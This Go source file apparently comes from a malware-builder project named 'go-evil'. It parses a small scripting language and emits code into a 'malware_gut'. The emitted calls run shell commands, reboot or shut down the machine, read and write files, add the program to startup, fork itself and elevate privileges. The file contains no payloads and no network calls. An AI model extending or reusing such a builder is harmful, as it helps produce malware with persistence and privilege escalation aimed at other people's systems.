package system

import (
	"fmt"
	"regexp"

	"github.com/s9rA16Bf4/go-evil/utility/contains"
	"github.com/s9rA16Bf4/go-evil/utility/error"
	"github.com/s9rA16Bf4/go-evil/utility/json"
)

const (
	EXTRACT_SUBDOMAIN = "(system)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
	EXTRACT_FUNCTION  = "(system)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
)

func Parse(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("system.Parse()")

	for _, line := range data_structure.File_gut {
		value := contains.Passed_value(line)

		regex := regexp.MustCompile(EXTRACT_SUBDOMAIN)
		result := regex.FindAllStringSubmatch(line, -1)

		if len(result) > 0 { // There is a subdomain to extract
			subdomain := result[0][2]
			function := result[0][3]

			switch subdomain {
			case "command":
				switch function {
				case "run":
					data_structure.Append_malware_gut(fmt.Sprintf("sys.RunCommand(\"%s\")", value))
				case "reboot":
					data_structure.Append_malware_gut("sys.Reboot()")
				case "shutdown":
					data_structure.Append_malware_gut("sys.Shutdown()")
				default:
					error.Function_error(function, "system.Parse()")
				}
			case "io":
				switch function {
				case "in":
					data_structure.Append_malware_gut("sys.User_input()")
				case "out":
					data_structure.Append_malware_gut(fmt.Sprintf("sys.Out(\"%s\")", value))
				case "read_file":
					data_structure.Append_malware_gut(fmt.Sprintf("sys.ReadFile(\"%s\")", value))
				case "write_file":
					data_structure.Append_malware_gut(fmt.Sprintf("sys.CreateFile(\"%s\")", value))
				default:
					error.Function_error(function, "system.Parse()")
				}

			case "set":
				switch function {
				case "file_name":
					data_structure.Append_malware_gut(fmt.Sprintf("sys.Set_filename(\"%s\")", value))
				case "output":
					data_structure.Append_malware_gut(fmt.Sprintf("sys.Set_output(\"%s\")", value))
				default:
					error.Function_error(function, "system.Parse()")
				}
			default:
				error.Subdomain_error(subdomain, "system.Parse()")
			}
		} else { // There might be a function which doesn't require a subdomain to work
			regex := regexp.MustCompile(EXTRACT_FUNCTION)
			result := regex.FindAllStringSubmatch(line, -1)
			if len(result) > 0 {
				function := result[0][2]
				switch function {
				case "exit":
					data_structure.Append_malware_gut(fmt.Sprintf("sys.Exit(\"%s\")", value))
				case "add_to_startup":
					data_structure.Append_malware_gut("sys.AddToStartup()")
				case "spawn":
					data_structure.Append_File_domain("syscall") // Needed
					data_structure.Append_malware_gut("syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)")
				case "elevate":
					data_structure.Append_malware_gut("sys.Elevate()")
				default:
					error.Function_error(function, "system.Parse()")
				}
			}
		}
	}

	return json.Send(data_structure)
}
